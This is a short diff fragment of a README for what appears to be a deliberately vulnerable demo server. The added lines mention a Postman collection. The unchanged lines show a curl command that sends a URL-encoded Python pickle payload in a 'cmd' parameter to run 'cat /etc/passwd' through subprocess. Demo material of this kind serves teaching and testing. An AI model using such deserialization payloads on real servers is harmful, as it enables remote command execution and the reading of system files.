@@ -32,3 +32,5 @@ POST query: curl POST <Server_URL>:<Port> -d ‘{“cmd”:“csubprocess%0Achec
 Example curl command (executed from localhost of server) for returning all etc/passwd users and passwords:
 curl http://127.0.0.1/?cmd=csubprocess%0Acheck_output%0Ap1%0A%28%28lp2%0AS%27cat%27%0Ap3%0AaS%27%2Fetc%2Fpasswd%27%0Ap4%0AatRp5%0A.
 ``
+
+Example postman collection is included in this repo. Make sure you change the variable of 'moveit_demo_url' located within the collection itself - point it to your own server URL (http://host/admin).
